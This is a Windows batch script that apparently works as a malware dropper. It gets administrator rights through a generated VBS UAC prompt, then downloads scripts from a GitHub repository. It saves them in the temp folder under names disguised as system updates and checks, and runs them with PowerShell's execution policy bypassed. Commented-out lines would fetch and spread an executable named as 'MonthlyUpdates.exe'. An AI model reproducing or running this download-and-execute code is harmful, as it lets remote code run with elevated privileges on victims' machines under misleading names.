@echo off
setlocal

:: Check for administrative privileges
:: BatchGotAdmin
:-------------------------------------
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0" 

    :: Configure download URLs and file paths
set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/prep.cmd"
set "PS1.2_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/scanner.ps1"
rem set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/Advance.exe"
set "PS1.3_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/nssm.bat"
set "PS1_FILE=%temp%\WinUpdate.cmd"
rem set "EXE_FILE=%temp%\SysRegistry.exe"
set "PS1.2_FILE=%temp%\IdleSystemCheck.ps1"
set "PS1.3_FILE=%temp%\nssm.bat"

:: Download files using PowerShell
echo Downloading files...
powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_FILE%'"
rem powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_FILE%'"
powershell -Command "Invoke-WebRequest -Uri '%PS1.2_URL%' -OutFile '%PS1.2_FILE%'"
powershell -Command "Invoke-WebRequest -Uri '%PS1.3_URL%' -OutFile '%PS1.3_FILE%'"

:: Execute PowerShell script with unrestricted policy
echo Executing PowerShell script...
powershell -ExecutionPolicy Bypass -File "%PS1_FILE%"

:: Wait for 60 seconds
echo Waiting for 60 seconds...
timeout /t 60 /nobreak >nul

:: Execute the downloaded program
rem echo Launching executable...
rem start "" "%EXE_FILE%"

powershell -ExecutionPolicy Bypass -File "%PS1.3_FILE%"

:: Execute deployment script with parameters
rem echo Starting network deployment...
rem powershell -ExecutionPolicy Bypass -Command "& '%PS1.2_FILE%' -UpdateServer 'https://github.com/Drakovthe6th/TBuG/raw/master/Advance.exe' -ExeName 'MonthlyUpdates.exe'"

endlocal